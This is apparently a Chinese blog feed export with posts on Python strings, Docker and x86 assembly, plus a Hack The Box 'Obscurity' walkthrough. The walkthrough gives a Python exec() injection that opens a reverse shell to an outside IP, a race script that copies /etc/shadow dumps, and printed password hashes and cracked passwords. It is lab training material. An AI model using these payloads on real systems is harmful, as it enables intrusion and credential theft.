创建md5对象    hl = hashlib.md5()    # Tips    # 此处必须声明encode    # 否则报错为：hl.update(str)    Unicode-objects must be encoded before hashing    hl.update(str.encode(encoding=&#39;utf-8&#39;))    print(&#39;MD5加密前为 ：&#39; + str)    print(&#39;MD5加密后为 ：&#39; + hl.hexdigest())</code></pre><h2 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h2><h3 id="判断字符串是否为空"><a href="#判断字符串是否为空" class="headerlink" title="判断字符串是否为空"></a>判断字符串是否为空</h3><p>用 <code>a == None</code> 是不行的</p><p>可以这样</p><pre><code class="python">a = &quot;&quot;if a.strip() == &quot;&quot;:    print(&quot;a is null&quot;)</code></pre><h3 id="list和str转换"><a href="#list和str转换" class="headerlink" title="list和str转换"></a>list和str转换</h3><pre><code class="python">In [17]: a = &quot;aaaafasfasd&quot;In [18]: list(a)Out[18]: [&#39;a&#39;, &#39;a&#39;, &#39;a&#39;, &#39;a&#39;, &#39;f&#39;, &#39;a&#39;, &#39;s&#39;, &#39;f&#39;, &#39;a&#39;, &#39;s&#39;, &#39;d&#39;]</code></pre><h3 id="固定长度分割字符串"><a href="#固定长度分割字符串" class="headerlink" title="固定长度分割字符串"></a>固定长度分割字符串</h3><p>传统上一般是遍历</p><pre><code class="python">def fix_width_split(string, width):    return [string[x : x + width] for x in range(0, len(string), width)]print fix_width_split(&#39;123456789&#39;, 3)</code></pre><p>但是如果有了正则，可以这样</p><pre><code class="python">import restring = &#39;123456789&#39;split = re.findall(r&#39;.{7}&#39;, string)</code></pre><p>结果</p><pre><code class="python">In [76]: string = &#39;123456789&#39;In [77]: split = re.findall(&quot;.{3}&quot;, string)In [78]: splitOut[78]: [&#39;123&#39;, &#39;456&#39;, &#39;789&#39;]</code></pre><h3 id="bytes写入文件"><a href="#bytes写入文件" class="headerlink" title="bytes写入文件"></a>bytes写入文件</h3><p>以二进制方式打开即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/sunxb10/article/details/81036693" target="_blank" rel="noopener">python格式化字符串f-string</a></p><p><a href="https://www.40huo.cn/blog/python-string-tricks.html" target="_blank" rel="noopener">python字符串trick</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
            <tag> bytes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Obscurity靶机实战</title>
      <link href="/posts/a0911a0b/"/>
      <url>/posts/a0911a0b/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里可以先设置一下hosts文件 </p><pre><code>10.10.10.168 obscure.htb</code></pre><p>扫描端口发现开放了 <code>8080</code> 的web端口</p><p>页面提示有一个源码泄露</p><pre><code>Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory</code></pre><p>那我们就需要爆破目录了</p><p>使用 <code>wfuzz</code></p><pre><code class="bash">sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code></pre><p><img src="/posts/a0911a0b/1580912401299.png" alt></p><p>得到源码：</p><pre><code class="python">import socketimport threadingfrom datetime import datetimeimport sysimport osimport mimetypesimport urllib.parseimport subprocessrespTemplate = &quot;&quot;&quot;HTTP/1.1 {statusNum} {statusCode}Date: {dateSent}Server: {server}Last-Modified: {modified}Content-Length: {length}Content-Type: {contentType}Connection: {connectionType}{body}&quot;&quot;&quot;DOC_ROOT = &quot;DocRoot&quot;CODES = {&quot;200&quot;: &quot;OK&quot;,         &quot;304&quot;: &quot;NOT MODIFIED&quot;,        &quot;400&quot;: &quot;BAD REQUEST&quot;, &quot;401&quot;: &quot;UNAUTHORIZED&quot;, &quot;403&quot;: &quot;FORBIDDEN&quot;, &quot;404&quot;: &quot;NOT FOUND&quot;,         &quot;500&quot;: &quot;INTERNAL SERVER ERROR&quot;}MIMES = {&quot;txt&quot;: &quot;text/plain&quot;, &quot;css&quot;:&quot;text/css&quot;, &quot;html&quot;:&quot;text/html&quot;, &quot;png&quot;: &quot;image/png&quot;, &quot;jpg&quot;:&quot;image/jpg&quot;,         &quot;ttf&quot;:&quot;application/octet-stream&quot;,&quot;otf&quot;:&quot;application/octet-stream&quot;, &quot;woff&quot;:&quot;font/woff&quot;, &quot;woff2&quot;: &quot;font/woff2&quot;,         &quot;js&quot;:&quot;application/javascript&quot;,&quot;gz&quot;:&quot;application/zip&quot;, &quot;py&quot;:&quot;text/plain&quot;, &quot;map&quot;: &quot;application/octet-stream&quot;}class Response:    def __init__(self, **kwargs):        self.__dict__.update(kwargs)        now = datetime.now()        self.dateSent = self.modified = now.strftime(&quot;%a, %d %b %Y %H:%M:%S&quot;)    def stringResponse(self):        return respTemplate.format(**self.__dict__)class Request:    def __init__(self, request):        self.good = True        try:            request = self.parseRequest(request)            self.method = request[&quot;method&quot;]            self.doc = request[&quot;doc&quot;]            self.vers = request[&quot;vers&quot;]            self.header = request[&quot;header&quot;]            self.body = request[&quot;body&quot;]        except:            self.good = False    def parseRequest(self, request):                req = request.strip(&quot;\r&quot;).split(&quot;\n&quot;)        method,doc,vers = req[0].split(&quot; &quot;)        header = req[1:-3]        body = req[-1]        headerDict = {}        for param in header:            pos = param.find(&quot;: &quot;)            key, val = param[:pos], param[pos+2:]            headerDict.update({key: val})        return {&quot;method&quot;: method, &quot;doc&quot;: doc, &quot;vers&quot;: vers, &quot;header&quot;: headerDict, &quot;body&quot;: body}class Server:    def __init__(self, host, port):            self.host = host        self.port = port        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        self.sock.bind((self.host, self.port))    def listen(self):        self.sock.listen(5)        while True:            client, address = self.sock.accept()            client.settimeout(60)            threading.Thread(target = self.listenToClient,args = (client,address)).start()    def listenToClient(self, client, address):        size = 1024        while True:            try:                data = client.recv(size) # 收到客户端的数据，应该就是数据包                if data:                    # Set the response to echo back the recieved data                     req = Request(data.decode()) # byte转str，返回的req是list                    self.handleRequest(req, client, address)                    client.shutdown()                    client.close()                else:                    raise error(&#39;Client disconnected&#39;)            except:                client.close()                return False    def handleRequest(self, request, conn, address):        if request.good:#            try:                # print(str(request.method) + &quot; &quot; + str(request.doc), end=&#39; &#39;)                # print(&quot;from {0}&quot;.format(address[0]))#            except Exception as e:#                print(e)            document = self.serveDoc(request.doc, DOC_ROOT)            statusNum=document[&quot;status&quot;]        else:            document = self.serveDoc(&quot;/errors/400.html&quot;, DOC_ROOT)            statusNum=&quot;400&quot;        body = document[&quot;body&quot;]        statusCode=CODES[statusNum]        dateSent = &quot;&quot;        server = &quot;BadHTTPServer&quot;        modified = &quot;&quot;        length = len(body)        contentType = document[&quot;mime&quot;] # Try and identify MIME type from string        connectionType = &quot;Closed&quot;        resp = Response(        statusNum=statusNum, statusCode=statusCode,         dateSent = dateSent, server = server,         modified = modified, length = length,         contentType = contentType, connectionType = connectionType,         body = body        )        data = resp.stringResponse()        if not data:            return -1        conn.send(data.encode())        return 0    def serveDoc(self, path, docRoot):        path = urllib.parse.unquote(path)        try:            info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug            exec(info.format(path)) # This is how you do string formatting, right?            cwd = os.path.dirname(os.path.realpath(__file__))            docRoot = os.path.join(cwd, docRoot)            if path == &quot;/&quot;:                path = &quot;/index.html&quot;            requested = os.path.join(docRoot, path[1:])            if os.path.isfile(requested):                mime = mimetypes.guess_type(requested)                mime = (mime if mime[0] != None else &quot;text/html&quot;)                mime = MIMES[requested.split(&quot;.&quot;)[-1]]                try:                    with open(requested, &quot;r&quot;) as f:                        data = f.read()                except:                    with open(requested, &quot;rb&quot;) as f:                        data = f.read()                status = &quot;200&quot;            else:                errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;404.html&quot;)                mime = &quot;text/html&quot;                with open(errorPage, &quot;r&quot;) as f:                    data = f.read().format(path)                status = &quot;404&quot;        except Exception as e:            print(e)            errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;500.html&quot;)            mime = &quot;text/html&quot;            with open(errorPage, &quot;r&quot;) as f:                data = f.read()            status = &quot;500&quot;        return {&quot;body&quot;: data, &quot;mime&quot;: mime, &quot;status&quot;: status}</code></pre><p>审计源码发现关键点：</p><pre><code class="python">def serveDoc(self, path, docRoot):    path = urllib.parse.unquote(path)    try:        info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug        exec(info.format(path)) # This is how you do string formatting, right?        cwd = os.path.dirname(os.path.realpath(__file__))        docRoot = os.path.join(cwd, docRoot)</code></pre><p>大致说一下代码的含义，开启socket监听，接收到http请求，调用 <code>Request</code> 类的 <code>parseRequest</code> 方法做分割，然后调用 <code>handleRequest</code> 处理请求，通过 <code>serveDoc</code> 处理请求的文档</p><p><code>exec</code> 函数处存在命令注入</p><pre><code class="python">In [33]: path = &quot;/&#39;;os.system(&#39;whoami&#39;)#&quot;In [34]: exec(info.format(path))laptop-ubiep4k5\zz</code></pre><p>然后就可以通过python反弹shell了</p><pre><code class="python">import requestsimport urllibimport osurl = &#39;http://10.10.10.168:8080/&#39;path=&#39;5\&#39;&#39;+&#39;\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.146&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])\na=\&#39;&#39;payload = urllib.parse.quote(path)print(&quot;payload&quot;)print(url+payload)r= requests.get(url+payload)print(r.headers)print(r.text)</code></pre><p>反弹到shell之后继续进行信息收集：</p><p><code>check.txt</code>，大致含义就是加密了这个文件，加密的结果是 <code>out.txt</code></p><pre><code class="bash">www-data@obscure:/home/robert$ cat check.txtcat check.txtEncrypting this file with your key should result in out.txt, make sure your key is correct!</code></pre><p><code>out.txt</code>, 这个就是加密的结果</p><pre><code>www-data@obscure:/home/robert$ xxd out.txtxxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................000000b0: c38c c397 c289 c281 76                   ........v</code></pre><p><code>passwordreminder.txt</code> 又是一个加密后的文件</p><pre><code>www-data@obscure:/home/robert$ hd passwordreminder.txthd passwordreminder.txt00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  |................|00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 |..........k|0000001b</code></pre><p> <code>BetterSSH.py</code> (这个之后提权会用到)</p><pre><code class="python">www-data@obscure:/home/robert/BetterSSH$ cat BetterSSH.pycat BetterSSH.pyimport sysimport random, stringimport osimport timeimport cryptimport tracebackimport subprocesspath = &#39;&#39;.join(random.choices(string.ascii_letters + string.digits, k=8))session = {&quot;user&quot;: &quot;&quot;, &quot;authenticated&quot;: 0}try:    session[&#39;user&#39;] = input(&quot;Enter username: &quot;)    passW = input(&quot;Enter password: &quot;)    with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:        data = f.readlines()    data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]    passwords = []    for x in data:        if not x == None:            passwords.append(x)    passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])    with open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:        f.write(passwordFile)    time.sleep(.1)    salt = &quot;&quot;    realPass = &quot;&quot;    for p in passwords:        if p[0] == session[&#39;user&#39;]:            salt, realPass = p[1].split(&#39;$&#39;)[2:]            break    if salt == &quot;&quot;:        print(&quot;Invalid user&quot;)        os.remove(&#39;/tmp/SSH/&#39;+path)        sys.exit(0)    salt = &#39;$6$&#39;+salt+&#39;$&#39;    realPass = salt + realPass    hash = crypt.crypt(passW, salt)    if hash == realPass:        print(&quot;Authed!&quot;)        session[&#39;authenticated&#39;] = 1    else:        print(&quot;Incorrect pass&quot;)        os.remove(&#39;/tmp/SSH/&#39;+path)        sys.exit(0)    os.remove(os.path.join(&#39;/tmp/SSH/&#39;,path))except Exception as e:    traceback.print_exc()    sys.exit(0)if session[&#39;authenticated&#39;] == 1:    while True:        command = input(session[&#39;user&#39;] + &quot;@Obscure$ &quot;)        cmd = [&#39;sudo&#39;, &#39;-u&#39;,  session[&#39;user&#39;]]        cmd.extend(command.split(&quot; &quot;))        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)        o,e = proc.communicate()        print(&#39;Output: &#39; + o.decode(&#39;ascii&#39;))        print(&#39;Error: &#39;  + e.decode(&#39;ascii&#39;)) if len(e.decode(&#39;ascii&#39;)) &gt; 0 else print(&#39;&#39;)</code></pre><p><code>SuperSecureCrypt.py</code></p><pre><code class="python">www-data@obscure:/home/robert$ cat SuperSecureCrypt.pycat SuperSecureCrypt.pyimport sysimport argparsedef encrypt(text, key):    keylen = len(key)    keyPos = 0    encrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr + ord(keyChr)) % 255)        encrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return encrypteddef decrypt(text, key):    keylen = len(key)    keyPos = 0    decrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr - ord(keyChr)) % 255)        decrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return decryptedparser = argparse.ArgumentParser(description=&#39;Encrypt with 0bscura\&#39;s encryption algorithm&#39;)parser.add_argument(&#39;-i&#39;,                    metavar=&#39;InFile&#39;,                    type=str,                    help=&#39;The file to read&#39;,                    required=False)parser.add_argument(&#39;-o&#39;,                    metavar=&#39;OutFile&#39;,                    type=str,                    help=&#39;Where to output the encrypted/decrypted file&#39;,                    required=False)parser.add_argument(&#39;-k&#39;,                    metavar=&#39;Key&#39;,                    type=str,                    help=&#39;Key to use&#39;,                    required=False)parser.add_argument(&#39;-d&#39;, action=&#39;store_true&#39;, help=&#39;Decrypt mode&#39;)args = parser.parse_args()banner = &quot;################################\n&quot;banner+= &quot;#           BEGINNING          #\n&quot;banner+= &quot;#    SUPER SECURE ENCRYPTOR    #\n&quot;banner+= &quot;################################\n&quot;banner += &quot;  ############################\n&quot;banner += &quot;  #        FILE MODE         #\n&quot;banner += &quot;  ############################&quot;print(banner)if args.o == None or args.k == None or args.i == None:    print(&quot;Missing args&quot;)else:    if args.d:        print(&quot;Opening file {0}...&quot;.format(args.i))        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:            data = f.read()        print(&quot;Decrypting...&quot;)        decrypted = decrypt(data, args.k)        print(&quot;Writing to {0}...&quot;.format(args.o))        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:            f.write(decrypted)    else:        print(&quot;Opening file {0}...&quot;.format(args.i))        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:            data = f.read()        print(&quot;Encrypting...&quot;)        encrypted = encrypt(data, args.k)        print(&quot;Writing to {0}...&quot;.format(args.o))        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:            f.write(encrypted)</code></pre><p>从加密的脚本中可以知道关键的加密逻辑：</p><pre><code class="python">def encrypt(text, key):    keylen = len(key)    keyPos = 0    encrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr + ord(keyChr)) % 255)        encrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return encrypted</code></pre><p>所以我们只需要爆破密钥了</p><p>爆破脚本</p><pre><code class="python">import stringwith open(&#39;check.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:    ta = f.read()key=&#39;&#39;with open(&#39;out.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:    data = f.read()    for x in range(len(data)):        for i in range(255):            ch = chr((ord(data[x])-i)%255)            if ch == ta[x]:                key +=chr(i)                break    print(key)</code></pre><p>得到密钥</p><pre><code>alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal</code></pre><blockquote><p>这里我遇到了一个难点，不知道如何将文件copy出来，本来我是可以通过 <code>python3 -m http.server 8001</code> 在靶机上开一个端口的，但是不知道为什么不成功。所以我这里是通过xxd来复原的</p></blockquote><p>将 xxd 得到的结果复制出来，然后我们可以通过<code>xxd -r</code> 反向 <code>dump</code> 出结果</p><pre><code>robert@obscure:~$ xxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................000000b0: c38c c397 c289 c281 76                   ........v</code></pre><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>得到密钥之后我们再解密即可</p><pre><code class="bash">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/key.txt -k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -dk alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d#################################           BEGINNING          ##    SUPER SECURE ENCRYPTOR    #################################  ############################  #        FILE MODE         #  ############################Opening file passwordreminder.txt...Decrypting...Writing to /tmp/key.txt...www-data@obscure:/home/robert$ cat /tmp/key.txtcat /tmp/key.txtSecThruObsFTW</code></pre><p>成功登陆</p><p>拿到 flag</p><pre><code class="bash">robert@obscure:~$ lsBetterSSH  check.txt  out.txt  passwordreminder.txt  SuperSecureCrypt.py  user.txtrobert@obscure:~$ cat user.txte4493782066b55fe2755708736ada2d7</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>robert用户登陆之后，<code>sudo -l</code> 查看能够执行的root命令，发现能够以root身份执行 <code>BetterSSH.py</code></p><pre><code class="bash">robert@obscure:~$ sudo -lMatching Defaults entries for robert on obscure:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser robert may run the following commands on obscure:    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code></pre><p>审计源码发现关键点：</p><pre><code class="python">with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:    data = f.readlines()data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]passwords = []for x in data:    if not x == None:        passwords.append(x)passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])with open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:    f.write(passwordFile)</code></pre><p>程序会将 <code>/etc/shadow</code> 写入到 <code>/tmp/SSH</code> 的某个随机的目录中，于是想到我们只需要写个死循环不断地复制该目录下的文件即可</p><pre><code class="python">import shutilimport oswhile True:    files = os.listdir(&quot;./SSH&quot;)    for file in files:        shutil.copy(os.path.join(&quot;./SSH&quot;, file), &quot;./flag&quot;);</code></pre><p>或者使用 <code>shell</code> 脚本</p><pre><code class="shell">robert@obscure:/tmp$ cat scandir.sh#/bin/bashpath=$1while (true); do    file=$(ls $path)    if [ &quot;${file}&quot; == &quot;&quot; ]    then        continue    else        mv $path/$file ./        break    fidone</code></pre><p>然后我们执行就会发现 <code>flag</code> 目录中存在文件</p><pre><code class="python">robert@obscure:/tmp/flag$ lsTdrs5183robert@obscure:/tmp/flag$ cat Tdrs5183root$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1182260999997robert$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/181630999997</code></pre><p>john 解密得到 <code>mercedes</code></p><pre><code class="bash">robert@obscure:/tmp$ sudo python3 ~/BetterSSH/BetterSSH.pyEnter username: rootEnter password: mercedesAuthed!root@Obscure$ lsOutput: SSHsystemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-resolved.service-zZTUtHsystemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-timesyncd.service-AkWIWivmware-root_574-2990744286root@Obscure$ cat /root/root.txtOutput: 512fd4429f33a113a44d5acde23609e3</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做完后感觉并不是很难，但是还是发现自己在代码的能力偏弱，写个脚本要花很长的时间</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker基本使用指南</title>
      <link href="/posts/70b2e753/"/>
      <url>/posts/70b2e753/</url>
      
        <content type="html"><![CDATA[<h2 id="docker-遇到的坑"><a href="#docker-遇到的坑" class="headerlink" title="docker 遇到的坑"></a>docker 遇到的坑</h2><p>运行的时候不能直接用 <code>./</code> 指定当前的文件，需要 <code>$PWD</code></p><p>一次性清理所有的已经关闭的容器<br> <code>docker ps -a | grep Exit | cut -d &#39; &#39; -f 1 | xargs docker rm</code></p><p><code>:ro</code> 表示只读</p><p>访问受到限制</p><p><img src="/posts/70b2e753/1580653426115.png" alt></p><p>此时目录下的文件权限</p><p><img src="/posts/70b2e753/1580653436093.png" alt></p><p>重新运行了一下</p><p><img src="/posts/70b2e753/1580653447982.png" alt></p><p>看来是文件权限的问题，也就是说docker会默认将文件权限直接复制过来，由于我之前的那个用户是pxy，而docker环境中并没有这个用户，导致就变成了1000</p><h2 id="移除镜像"><a href="#移除镜像" class="headerlink" title="移除镜像"></a>移除镜像</h2><pre><code>docker image rm xxxx</code></pre><h2 id="–link-参数"><a href="#–link-参数" class="headerlink" title="–link 参数"></a>–link 参数</h2><p>自动添加了环境变量</p><p><img src="/posts/70b2e753/1580653523204.png" alt></p><p><img src="/posts/70b2e753/1580653527989.png" alt></p><p>还有这个</p><p><img src="/posts/70b2e753/1580653537486.png" alt></p><p><code>/etc/hosts</code> 也会更新</p><p><img src="/posts/70b2e753/1580653546884.png" alt></p><p>神奇。。<br>运行nginx和php-fpm<br><code>docker run --name  myphp-fpm -v $PWD/www:/www  -d php:5.6-fpm</code></p><pre><code>$ docker run --name runoob-php-nginx -p 8083:80 -d \               -v $PWD/www:/usr/share/nginx/html:ro \    -v $PWD/conf/conf.d:/etc/nginx/conf.d:ro \    --link myphp-fpm:php \ ----&gt; 注意需要取别名nginx</code></pre><p>如果不取别名的话直接闪退，别名可以理解成对应的主机地址</p><p><img src="/posts/70b2e753/1580653561167.png" alt></p><p>然后开始折腾docker-compose.yml</p><pre><code class="yaml">version: &#39;2&#39;services:  nginx:    image: nginx:latest    volumes:      - ./conf/conf.d:/etc/nginx/conf.d      - ./www:/usr/share/nginx/html    depends_on:      - myphp-fpm    links:      - myphp-fpm:php    ports:      - &quot;8083:80&quot;  myphp-fpm:    image: php:5.6-fpm    volumes:      - ./www:/www</code></pre><p>试了多次，<code>links</code> 需要取别名</p><p>同时文件的权限也很重要，不然会出现无法读取flag的情况</p><h2 id="Dockerfile-编写"><a href="#Dockerfile-编写" class="headerlink" title="Dockerfile 编写"></a>Dockerfile 编写</h2><p><code>WORKDIR</code> 指定工作目录，这样就能够在执行一些shell命令的时候不需要指明路径了</p><h2 id="docker无法运行-mysql容器"><a href="#docker无法运行-mysql容器" class="headerlink" title="docker无法运行 mysql容器"></a>docker无法运行 mysql容器</h2><p>这是由于我偷懒只在本机安装了 mysql 得客户端，没有安装服务端，这也是很神奇了</p><h2 id="docker运行phpmyadmin"><a href="#docker运行phpmyadmin" class="headerlink" title="docker运行phpmyadmin"></a>docker运行phpmyadmin</h2><p>我发现并不需要 nginx ,当然如果有nginx的情况下可以做到反向代理比较好一点</p><pre><code class="yaml">version: &quot;3&quot;services:  phpmyadmin:    image: phpmyadmin/phpmyadmin    ports:       - 8081:80    links:      - mysql:db  mysql:    image: mysql:5.6    environment:       - MYSQL_ROOT_PASSWORD=123456</code></pre><h2 id="nginx结合mysql"><a href="#nginx结合mysql" class="headerlink" title="nginx结合mysql"></a>nginx结合mysql</h2><pre><code class="yaml">version: &#39;2&#39;services:  nginx:    image: nginx:latest    volumes:      - ./conf/conf.d:/etc/nginx/conf.d      - ./www:/usr/share/nginx/html    depends_on:      - myphp-fpm    links:      - myphp-fpm:php    ports:      - &quot;8083:80&quot;  myphp-fpm:    image: php/kuozhan    volumes:      - ./www:/www    links:      - mysql:db  mysql:    image: mysql:5.6    restart: always    environment:      - MYSQL_ROOT_PASSWORD=123456</code></pre><h2 id="nginx配置学习"><a href="#nginx配置学习" class="headerlink" title="nginx配置学习"></a>nginx配置学习</h2><p>nginx的配置文件以后再单独写，这里先学一点</p><p>怎么理解 nginx和php-fpm的关系呢</p><p>我在配置docker环境的时候意识到nginx和php两个镜像是相互独立的，首先运行php-fpm镜像，将其内部的 <code>/www</code> 映射到我外部的 <code>./www</code> 目录中，然后再运行 nginx 镜像，将其 <code>/usr/share/nginx/html</code> 映射到 <code>./www</code> 目录，同时还需要做两件事</p><ol><li>配置nginx，指定解析的脚本目在 <code>/www</code> 目录中</li><li>连接php-fpm容器，需要将解析到 php 这个域名才行</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土二</title>
      <link href="/posts/6cc1a5d6/"/>
      <url>/posts/6cc1a5d6/</url>
      
        <content type="html"><![CDATA[<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>intel的CPU是采用的小端法来存储数据</p><p>在查看内存的时候，我更愿意按照这样的方式，我认为0号应该代表第一根横线，也就是认为是第一个存储单元的开始，也就是说我觉得 0~1 这个单元存放着 20H，因为这样在后续分析栈的时候比较有用</p><p><img src="/posts/6cc1a5d6/1580653048875.png" alt></p><p>字单元：存放一个字节型数据的内存单元，也就是两个字节16位，高位放高地址，低位放低地址</p><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>数据段寄存器默认为 ds</p><p>所以我们要操作内存数据的时候只需要指定偏移即可</p><p>CPU不支持直接将数据送入到段寄存器，需要有寄存器作为中转</p><pre><code class="x86asm">mov bx,1000Hmov ds,bxmov [0],al</code></pre><p>上述代码的含义：先设置ds寄存器为1000H，然后将al中的数据送往这个内存单元(所以我们要移动数据到内存的时候是需要先设置数据段的基地址的)</p><h2 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h2><p>mov 段寄存器，寄存器<br>mov 寄存器，段寄存器<br>mov 内存单元，寄存器<br>mov 寄存器，内存单元<br>mov 段寄存器，内存单元<br>mov 内存单元，段寄存器</p><p>但是 add 指令不能直接操作段寄存器和寄存器</p><p><img src="/posts/6cc1a5d6/1580653072050.png" alt></p><h2 id="数据段-1"><a href="#数据段-1" class="headerlink" title="数据段"></a>数据段</h2><p><img src="/posts/6cc1a5d6/1580653090896.png" alt></p><p>AX=0，BX=0</p><pre><code>mov ax,1mov ds,axmov ax,[0000] ;AX = 2662Hmov bx,[0001] ;BX = E626Hmov ax,bx     ;AX = 2662Hmov ax,[0000] ;AX = 2662Hmov bx,[0002] ;BX = D6E6Hadd ax,bx     ;AX = FD48Hadd ax,[0004] ;AX = 2ECC+FD48 = 2C14mov ax,0      ;AX = 0mov al,[0002] ;AX = E6Hmov bx,0      ;BX = 0mov bl,[000c] ;BX = 00Hadd al,bl     ;AX = E6H</code></pre><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>任意时刻 <code>SS:SP</code> 指向栈顶元素</p><p>PUSH 操作的过程</p><ol><li>SP = SP -2</li><li>SS:SP 指向新的地址</li><li>然后将数据送入到 <code>SS:SP</code> 指向的地址中</li></ol><p>然后就涉及到怎么计算 <code>SP</code> 的问题了</p><blockquote><p>只需要记住初始状态栈中没有元素，并且 SP+2 是栈中的第一个存储单元</p></blockquote><p><img src="/posts/6cc1a5d6/1580653127959.png" alt></p><p>POP 指令</p><ol><li>将SS:SP 指向的内存单元数据送入到寄存器中，或者是某个内存单元中</li><li>SP = SP + 2</li></ol><p>PUSH和POP的指令形式</p><pre><code>push 寄存器pop 寄存器push 段寄存器pop 段寄存器push 